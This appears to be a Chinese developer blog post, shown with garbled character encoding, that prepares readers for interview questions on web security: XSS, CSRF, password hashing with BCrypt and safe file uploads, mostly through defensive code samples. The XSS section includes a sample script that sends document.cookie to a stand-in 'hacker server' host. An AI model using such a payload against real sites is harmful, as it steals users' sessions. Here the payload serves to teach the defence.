                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ‰æ—¶å€™é¢è¯•å®˜å¯èƒ½ä¼šé—®ç½‘ç»œå®‰å…¨çš„é—®é¢˜ï¼Œä»–ä»¬ä¸æ˜¯æƒ³å¬ä½ èƒŒå®šä¹‰ï¼Œè€Œæ˜¯æƒ³çŸ¥é“ï¼š<strong>ä½ å†™ä»£ç æ—¶ï¼Œä¼šä¸ä¼šå¤šæƒ³è¿™ä¹ˆä¸€æ­¥</strong>ã€‚</p>
<p>æˆ‘ä»¬æ¥çœ‹ä¸‹ä¸‹é¢4ä¸ªé—®é¢˜ï¼Œæˆ–è®¸å¯ä»¥è®©æˆ‘ä»¬åœ¨é¢è¯•æ—¶æ›´åŠ æœ‰åº•æ°”ã€‚</p>
<h3 data-id="heading-0">1. XSSæ”»å‡»ï¼šç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼ŒçœŸçš„å®‰å…¨å—ï¼Ÿ</h3>
<p><strong>æ¡ˆä¾‹</strong>ï¼šå°å¼ åšäº†ä¸€ä¸ªè¯„è®ºåŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥è‡ªç”±å‘è¡¨è¯„è®ºã€‚ä»–ç›´æ¥æŠŠç”¨æˆ·è¾“å…¥çš„å†…å®¹æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šã€‚ç»“æœæŸå¤©ï¼Œé¦–é¡µè¢«æŒ‚ä¸Šäº†èµŒåšå¹¿å‘Šï¼Œç½‘ç«™è¢«ç™¾åº¦é™æƒ...</p>
<p><strong>å‘ç”Ÿäº†ä»€ä¹ˆ</strong>ï¼Ÿ<br/>
é»‘å®¢åœ¨è¯„è®ºé‡Œè¾“å…¥äº†è¿™æ ·çš„å†…å®¹ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-comment">// çªƒå–ç”¨æˆ·cookie</span>
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://é»‘å®¢æœåŠ¡å™¨.com/steal?cookie='</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>å½“å…¶ä»–ç”¨æˆ·çœ‹åˆ°è¿™æ¡è¯„è®ºæ—¶ï¼Œè¿™æ®µä»£ç è‡ªåŠ¨æ‰§è¡Œï¼Œç”¨æˆ·çš„ç™»å½•ä¿¡æ¯å°±è¢«å·èµ°äº†ï¼</p>
<p><strong>æ€ä¹ˆé˜²</strong>ï¼Ÿ<br/>
æ°¸è¿œä¸è¦ç›¸ä¿¡ç”¨æˆ·è¾“å…¥ï¼Œå¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼Œè¦åšæ¶ˆæ¯’å¤„ç†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å‰ç«¯ç®€å•æ¶ˆæ¯’å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sanitizeInput</span>(<span class="hljs-params">userInput</span>) {
  <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªä¸´æ—¶div</span>
  <span class="hljs-keyword">const</span> tempDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
  <span class="hljs-comment">// æŠŠç”¨æˆ·è¾“å…¥è®¾ä¸ºæ–‡æœ¬ï¼ˆä¸æ˜¯HTMLï¼‰</span>
  tempDiv.<span class="hljs-property">textContent</span> = userInput;
  <span class="hljs-comment">// è·å–å®‰å…¨çš„HTML</span>
  <span class="hljs-keyword">return</span> tempDiv.<span class="hljs-property">innerHTML</span>;
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> comment = <span class="hljs-string">"&lt;script&gt;alert('hack')&lt;/script&gt;"</span>;
<span class="hljs-keyword">const</span> safeComment = <span class="hljs-title function_">sanitizeInput</span>(comment);
<span class="hljs-comment">// safeComment å˜æˆ "&amp;lt;script&amp;gt;alert('hack')&amp;lt;/script&amp;gt;"</span>
<span class="hljs-comment">// æµè§ˆå™¨ä¼šåŸæ ·æ˜¾ç¤ºï¼Œä¸ä¼šæ‰§è¡Œè„šæœ¬</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åç«¯Javaæ¶ˆæ¯’ï¼ˆä½¿ç”¨å¼€æºåº“ï¼‰</span>
<span class="hljs-comment">// å…ˆå¼•å…¥ä¾èµ–ï¼šimplementation 'org.owasp.encoder:encoder'</span>

<span class="hljs-keyword">import</span> org.owasp.encoder.Encode;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeHtml</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">userInput</span> <span class="hljs-operator">=</span> <span class="hljs-string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>;
        <span class="hljs-comment">// å¯¹HTMLå†…å®¹è¿›è¡Œç¼–ç </span>
        <span class="hljs-type">String</span> <span class="hljs-variable">safeOutput</span> <span class="hljs-operator">=</span> Encode.forHtmlContent(userInput);
        System.out.println(safeOutput);
        <span class="hljs-comment">// è¾“å‡ºï¼š&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;</span>
    }
}
</code></pre>
<p><strong>é¢è¯•å°æŠ€å·§</strong>ï¼šä¸è¦åªè¯´è¦è¿‡æ»¤è¾“å…¥ï¼Œè€Œæ˜¯è¯´ï¼š"æˆ‘ä¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡ŒéªŒè¯ï¼Œå¯¹è¾“å‡ºå†…å®¹æ ¹æ®ä¸Šä¸‹æ–‡è¿›è¡Œç¼–ç ï¼Œå‰åç«¯åŒé‡é˜²æŠ¤ã€‚"</p>
<h3 data-id="heading-1">2. CSRFæ”»å‡»</h3>
<p><strong>æ¡ˆä¾‹</strong>ï¼šå°æåšäº†ä¸€ä¸ªé“¶è¡Œè½¬è´¦åŠŸèƒ½ï¼Œç”¨æˆ·ç™»å½•åå¯ä»¥è½¬è´¦ã€‚æŸå¤©ï¼Œæœ‰ç”¨æˆ·åæ˜ è´¦æˆ·é‡Œçš„é’±è¢«è½¬èµ°äº†ï¼Œä½†è‡ªå·±æ²¡æ“ä½œè¿‡ã€‚è°ƒæŸ¥å‘ç°ï¼Œç”¨æˆ·åœ¨ç™»å½•çŠ¶æ€ä¸‹ç‚¹å‡»äº†ä¸€ä¸ªæ¶æ„é“¾æ¥ï¼Œå°±è¢«æ‚„æ‚„è½¬è´¦äº†...</p>
<p><strong>å‘ç”Ÿäº†ä»€ä¹ˆ</strong>ï¼Ÿ<br/>
å½“ä½ ç™»å½•ä¸€ä¸ªç½‘ç«™ï¼Œæµè§ˆå™¨ä¼šä¿å­˜ä¸€ä¸ªèº«ä»½è¯æ˜ï¼ˆCookieï¼‰ã€‚é»‘å®¢åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œè¯±å¯¼ä½ ç‚¹å‡»ä¸€ä¸ªé“¾æ¥ï¼Œè¿™ä¸ªé“¾æ¥ä¼šè‡ªåŠ¨å‘é“¶è¡Œç½‘ç«™å‘é€è½¬è´¦è¯·æ±‚ã€‚å› ä¸ºä½ çš„æµè§ˆå™¨å¸¦ç€Cookieï¼Œé“¶è¡Œä»¥ä¸ºæ˜¯ä½ è‡ªå·±æ“ä½œçš„ï¼</p>
<p><strong>æ€ä¹ˆé˜²</strong>ï¼Ÿ<br/>
æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯éªŒè¯ç ï¼ˆCSRF Tokenï¼‰ï¼šæ¯ä¸ªè¡¨å•éƒ½æœ‰ä¸€ä¸ªéšæœºç”Ÿæˆçš„éªŒè¯ç ï¼ŒæœåŠ¡å™¨ä¼šéªŒè¯è¿™ä¸ªç æ˜¯å¦æœ‰æ•ˆã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- è¡¨å•ä¸­åŠ å…¥ä¸€ä¸ªéšè—çš„token --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/transfer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"csrf_token"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"éšæœºå­—ç¬¦ä¸²å¦‚a1b2c3d4e5"</span>&gt;</span>
  é‡‘é¢ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"amount"</span>&gt;</span>
  è´¦å·ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"to_account"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>è½¬è´¦<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åç«¯éªŒè¯token</span>
<span class="hljs-meta">@PostMapping("/transfer")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">transferMoney</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String amount, 
                           <span class="hljs-meta">@RequestParam</span> String to_account,
                           <span class="hljs-meta">@RequestParam</span> String csrf_token,
                           HttpSession session)</span> {
    
    <span class="hljs-comment">// ä»sessionè·å–æ­£ç¡®çš„token</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">validToken</span> <span class="hljs-operator">=</span> (String) session.getAttribute(<span class="hljs-string">"csrf_token"</span>);
    
    <span class="hljs-comment">// éªŒè¯token</span>
    <span class="hljs-keyword">if</span> (!csrf_token.equals(validToken)) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"æ— æ•ˆè¯·æ±‚"</span>);
    }
    
    <span class="hljs-comment">// æ‰§è¡Œè½¬è´¦</span>
    bankService.transfer(amount, to_account);
    <span class="hljs-keyword">return</span> <span class="hljs-string">"è½¬è´¦æˆåŠŸ"</span>;
}
</code></pre>
<p><strong>è§£é‡Š</strong>ï¼šå°±åƒé“¶è¡ŒæŸœå°è½¬è´¦ï¼Œä¸ä»…è¦çœ‹èº«ä»½è¯ï¼ˆç™»å½•çŠ¶æ€ï¼‰ï¼Œè¿˜è¦æ ¸å¯¹é¢„ç•™æ‰‹æœºå·æ”¶åˆ°çš„éªŒè¯ç ï¼ˆCSRF Tokenï¼‰ï¼Œè¦åŒé‡ç¡®è®¤æ˜¯å¦æ˜¯æœ¬äººæ“ä½œã€‚</p>
<h3 data-id="heading-2">3. å¯†ç å®‰å…¨</h3>
<p><strong>æ¡ˆä¾‹</strong>ï¼šæŸç½‘ç«™ç”¨æˆ·æ•°æ®æ³„éœ²ï¼Œ100ä¸‡ç”¨æˆ·çš„å¯†ç è¢«å…¬å¼€ã€‚è°ƒæŸ¥å‘ç°ï¼Œç½‘ç«™æŠŠå¯†ç ç›´æ¥å­˜åˆ°æ•°æ®åº“ï¼Œæ²¡æœ‰åšä»»ä½•å¤„ç†ã€‚æ›´å¯æ€•çš„æ˜¯ï¼Œå¾ˆå¤šç”¨æˆ·åœ¨å¤šä¸ªç½‘ç«™ç”¨åŒä¸€ä¸ªå¯†ç ...</p>
<p><strong>å¸¸è§çš„å¯†ç é”™è¯¯</strong>ï¼š</p>
<ul>
<li>å¯†ç æ˜æ–‡å­˜å‚¨ï¼ˆç›´æ¥å­˜åŸå§‹å¯†ç ï¼‰</li>
<li>åªåšç®€å•MD5åŠ å¯†ï¼ˆå¾ˆå®¹æ˜“ç ´è§£ï¼‰</li>
<li>ä¸é™åˆ¶ç™»å½•å°è¯•æ¬¡æ•°ï¼ˆå…è®¸æš´åŠ›ç ´è§£ï¼‰</li>
</ul>
<p><strong>æ­£ç¡®åšæ³•</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®‰å…¨çš„å¯†ç å­˜å‚¨ï¼ˆä½¿ç”¨BCryptï¼‰</span>
<span class="hljs-keyword">import</span> org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordSecurity</span> {
    
    <span class="hljs-comment">// åˆ›å»ºåŠ å¯†å™¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">BCryptPasswordEncoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>(<span class="hljs-number">12</span>);
    
    <span class="hljs-comment">// ç”¨æˆ·æ³¨å†Œæ—¶ï¼šåŠ å¯†å­˜å‚¨</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">registerUser</span><span class="hljs-params">(String username, String rawPassword)</span> {
        <span class="hljs-comment">// åŠ å¯†å¯†ç </span>
        <span class="hljs-type">String</span> <span class="hljs-variable">encodedPassword</span> <span class="hljs-operator">=</span> encoder.encode(rawPassword);
        <span class="hljs-comment">// ä¿å­˜åˆ°æ•°æ®åº“</span>
        userDao.save(username, encodedPassword);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"æ³¨å†ŒæˆåŠŸ"</span>;
    }
    
    <span class="hljs-comment">// ç”¨æˆ·ç™»å½•æ—¶ï¼šéªŒè¯å¯†ç </span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loginUser</span><span class="hljs-params">(String username, String rawPassword)</span> {
        <span class="hljs-comment">// ä»æ•°æ®åº“è·å–åŠ å¯†åçš„å¯†ç </span>
        <span class="hljs-type">String</span> <span class="hljs-variable">encodedPassword</span> <span class="hljs-operator">=</span> userDao.getPassword(username);
        <span class="hljs-comment">// éªŒè¯å¯†ç æ˜¯å¦åŒ¹é…</span>
        <span class="hljs-keyword">return</span> encoder.matches(rawPassword, encodedPassword);
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆBCryptæ›´å®‰å…¨</strong>ï¼Ÿ</p>
<ol>
<li><strong>åŠ ç›</strong>ï¼šæ¯ä¸ªäººçš„å¯†ç éƒ½åŠ äº†ä¸åŒçš„éšæœºå­—ç¬¦ä¸²ï¼Œé˜²æ­¢å½©è™¹è¡¨æ”»å‡»</li>
<li><strong>æ…¢åŠ å¯†</strong>ï¼šæ•…æ„è®¾è®¡å¾—å¾ˆæ…¢ï¼Œè®©é»‘å®¢éš¾ä»¥æš´åŠ›ç ´è§£</li>
<li><strong>è‡ªé€‚åº”</strong>ï¼šéšç€è®¡ç®—æœºå˜å¿«ï¼Œå¯ä»¥è°ƒæ•´éš¾åº¦</li>
</ol>
<p><strong>é¢å¤–å»ºè®®</strong>ï¼š</p>
<ul>
<li>é‡è¦æ“ä½œï¼ˆå¦‚ä¿®æ”¹å¯†ç ã€å¤§é¢è½¬è´¦ï¼‰è¦æ±‚äºŒæ¬¡éªŒè¯ï¼ˆçŸ­ä¿¡/é‚®ç®±ï¼‰</li>
<li>ç™»å½•å¤±è´¥5æ¬¡åé”å®šè´¦æˆ·ä¸€æ®µæ—¶é—´</li>
<li>å®šæœŸæé†’ç”¨æˆ·ä¿®æ”¹å¯†ç </li>
</ul>
<h3 data-id="heading-3">4. æ–‡ä»¶ä¸Šä¼ </h3>
<p><strong>å°æ•…äº‹</strong>ï¼šæŸè®ºå›å…è®¸ç”¨æˆ·ä¸Šä¼ å¤´åƒï¼Œç»“æœæœ‰é»‘å®¢ä¸Šä¼ äº†ä¸€ä¸ªå›¾ç‰‡ï¼Œå®é™…æ˜¯ä¸ªæ§åˆ¶æœåŠ¡å™¨çš„ç¨‹åºã€‚å‡ å¤©åï¼Œæ•´ä¸ªæœåŠ¡å™¨è¢«ç”¨æ¥æŒ–çŸ¿ï¼Œç½‘ç«™ç˜«ç—ª...</p>
<p><strong>é£é™©åœ¨å“ª</strong>ï¼Ÿ</p>
<ul>
<li>ä¸Šä¼ çš„å›¾ç‰‡å¯èƒ½æ˜¯æœ¨é©¬ç¨‹åº</li>
<li>æ–‡ä»¶åå¯èƒ½åŒ…å«"../"è·³åˆ°å…¶ä»–ç›®å½•</li>
<li>è¶…å¤§æ–‡ä»¶å¯èƒ½å¯¼è‡´æœåŠ¡å™¨å´©æºƒ</li>
</ul>
<p><strong>å®‰å…¨ä¸Šä¼ å››æ­¥æ³•</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PostMapping("/upload-avatar")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadAvatar</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam("file")</span> MultipartFile file)</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 1. æ£€æŸ¥æ–‡ä»¶å¤§å°ï¼ˆé™åˆ¶1MBï¼‰</span>
        <span class="hljs-keyword">if</span> (file.getSize() &gt; <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"æ–‡ä»¶ä¸èƒ½è¶…è¿‡1MB"</span>;
        }
        
        <span class="hljs-comment">// 2. æ£€æŸ¥æ–‡ä»¶ç±»å‹ï¼ˆåªå…è®¸å›¾ç‰‡ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">originalName</span> <span class="hljs-operator">=</span> file.getOriginalFilename();
        <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> originalName.substring(originalName.lastIndexOf(<span class="hljs-string">"."</span>) + <span class="hljs-number">1</span>).toLowerCase();
        
        <span class="hljs-keyword">if</span> (!Arrays.asList(<span class="hljs-string">"jpg"</span>, <span class="hljs-string">"jpeg"</span>, <span class="hljs-string">"png"</span>, <span class="hljs-string">"gif"</span>).contains(extension)) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶"</span>;
        }
        
        <span class="hljs-comment">// 3. ç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶åï¼ˆé¿å…ç‰¹æ®Šå­—ç¬¦å’Œè·¯å¾„é—®é¢˜ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">safeName</span> <span class="hljs-operator">=</span> UUID.randomUUID() + <span class="hljs-string">"."</span> + extension;
        
        <span class="hljs-comment">// 4. ä¿å­˜åˆ°å®‰å…¨ä½ç½®</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">savePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/safe/uploads/"</span> + safeName;
        file.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(savePath));
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®åœ°å€ï¼š/avatars/"</span> + safeName;
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ä¸Šä¼ å¤±è´¥ï¼š"</span> + e.getMessage();
    }
}
</code></pre>
<p><strong>æç¤º</strong>ï¼šä¸Šä¼ çš„æ–‡ä»¶ä¸è¦ç›´æ¥æ”¾åœ¨ç½‘ç«™ç›®å½•ä¸‹ï¼Œè€Œæ˜¯é€šè¿‡ç¨‹åºæ§åˆ¶è®¿é—®ã€‚è¿™æ ·å³ä½¿æœ‰äººä¸Šä¼ äº†æ¶æ„æ–‡ä»¶ï¼Œä¹Ÿæ— æ³•ç›´æ¥æ‰§è¡Œã€‚</p>
<h2 data-id="heading-4">é¢è¯•åŠ åˆ†é¡¹ï¼šå®‰å…¨æ€ç»´</h2>
<p>æŠ€æœ¯å¾ˆé‡è¦ï¼ŒåŒæ—¶é¢è¯•å®˜ä¹Ÿçœ‹é‡ä½ çš„<strong>æ€ç»´æ–¹å¼</strong>ã€‚ä»¥ä¸‹3ç‚¹ï¼Œè¯´å‡ºæ¥èƒ½åŠ åˆ†ï¼š</p>
<h3 data-id="heading-5">1. å®‰å…¨æ˜¯è¿‡ç¨‹ï¼Œä¸æ˜¯åŠŸèƒ½</h3>
<p>å¾ˆå¤šå›¢é˜ŸæŠŠå®‰å…¨å½“æˆé¡¹ç›®ç»“æŸå‰æ‰è€ƒè™‘çš„äº‹ã€‚å®é™…ä¸Šï¼Œ<strong>å®‰å…¨åº”è¯¥è´¯ç©¿æ•´ä¸ªå¼€å‘è¿‡ç¨‹</strong>ï¼š</p>
<ul>
<li>å†™éœ€æ±‚æ—¶ï¼šè€ƒè™‘å“ªäº›æ•°æ®æ•æ„Ÿï¼Œéœ€è¦ä¿æŠ¤</li>
<li>è®¾è®¡ç³»ç»Ÿæ—¶ï¼šæƒ³æƒ³å¯èƒ½æœ‰å“ªäº›é£é™©ç‚¹</li>
<li>å†™ä»£ç æ—¶ï¼šéµå¾ªå®‰å…¨ç¼–ç è§„èŒƒ</li>
<li>æµ‹è¯•æ—¶ï¼šåŒ…å«å®‰å…¨æµ‹è¯•</li>
<li>ä¸Šçº¿åï¼šç›‘æ§å¼‚å¸¸è¡Œä¸º</li>
</ul>
<h3 data-id="heading-6">2. æœ€å°æƒé™åŸåˆ™</h3>
<p>ç®€å•è¯´ï¼š<strong>åªç»™å¿…è¦çš„æƒé™</strong>ã€‚</p>
<p>åº”ç”¨åˆ°å¼€å‘ä¸­ï¼š</p>
<ul>
<li>æ•°æ®åº“è´¦å·ï¼šä¸è¦ç”¨rootè´¦å·è¿æ¥æ•°æ®åº“ï¼Œåˆ›å»ºä¸“ç”¨è´¦å·ï¼Œåªç»™å¿…è¦æƒé™</li>
<li>åå°ç®¡ç†ï¼šæ™®é€šç¼–è¾‘ä¸èƒ½åˆ é™¤ç”¨æˆ·ï¼Œç®¡ç†å‘˜æ‰èƒ½</li>
<li>APIæƒé™ï¼šç”¨æˆ·åªèƒ½çœ‹åˆ°è‡ªå·±çš„æ•°æ®ï¼Œçœ‹ä¸åˆ°åˆ«äººçš„</li>
</ul>
<h3 data-id="heading-7">3. å¤šå±‚é˜²å¾¡</h3>
<p>ä¸è¦åªé ä¸€ç§é˜²æŠ¤ï¼Œå°±åƒå®¶é‡Œæ—¢æœ‰é—¨é”ï¼Œä¹Ÿæœ‰é˜²ç›—çª—ã€‚å®‰å…¨ä¹Ÿä¸€æ ·ï¼š</p>
<ul>
<li>ç½‘ç»œå±‚ï¼šé˜²ç«å¢™æŒ¡ä½å¯ç–‘è®¿é—®</li>
<li>åº”ç”¨å±‚ï¼šè¾“å…¥éªŒè¯ã€æƒé™æ§åˆ¶</li>
<li>æ•°æ®å±‚ï¼šæ•æ„Ÿæ•°æ®åŠ å¯†</li>
<li>ä¸šåŠ¡å±‚ï¼šå¼‚å¸¸æ“ä½œç›‘æ§</li>
</ul>
<h2 data-id="heading-8">é¢è¯•æ€ä¹ˆå›ç­”ï¼Ÿæ¨¡æ¿æ¥äº†</h2>
<p>å½“é¢è¯•å®˜é—®"ç½‘ç»œå®‰å…¨äº†è§£å¤šå°‘"ï¼Œä½ å¯ä»¥è¿™æ ·è¯´ï¼š</p>
<blockquote>
<p>"æˆ‘è®¤ä¸ºå®‰å…¨ä¸æ˜¯æŸä¸ªéƒ¨é—¨çš„äº‹ï¼Œè€Œæ˜¯æ¯ä¸ªå¼€å‘è€…çš„è´£ä»»ã€‚åœ¨æˆ‘çš„å¼€å‘ç»éªŒä¸­ï¼Œæˆ‘ä¸»è¦å…³æ³¨å‡ ä¸ªå¸¸è§é£é™©ï¼š</p>
</blockquote>
<blockquote>
<p>ç¬¬ä¸€ï¼Œé˜²èŒƒXSSæ”»å‡»ã€‚æˆ‘ä¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡ŒéªŒè¯ï¼Œå¯¹è¾“å‡ºå†…å®¹åšç¼–ç å¤„ç†ï¼Œç¡®ä¿ç”¨æˆ·è¾“å…¥çš„å†…å®¹ä¸ä¼šè¢«å½“ä½œä»£ç æ‰§è¡Œã€‚</p>
</blockquote>
<blockquote>
<p>ç¬¬äºŒï¼Œé˜²èŒƒCSRFæ”»å‡»ã€‚æˆ‘ä¼šåœ¨è¡¨å•ä¸­ä½¿ç”¨CSRFä»¤ç‰Œï¼Œé‡è¦æ“ä½œè¦æ±‚äºŒæ¬¡éªŒè¯ï¼Œç¡®ä¿è¯·æ±‚æ˜¯ç”¨æˆ·çœŸå®æ„æ„¿ã€‚</p>
</blockquote>
<blockquote>
<p>ç¬¬ä¸‰ï¼Œå®‰å…¨å­˜å‚¨å¯†ç ã€‚æˆ‘ä½¿ç”¨BCryptç®—æ³•åŠ å¯†å­˜å‚¨å¯†ç ï¼Œè€Œä¸æ˜¯æ˜æ–‡æˆ–ç®€å•MD5ï¼Œé‡è¦æ“ä½œå¢åŠ é¢å¤–éªŒè¯ã€‚</p>
</blockquote>
<blockquote>
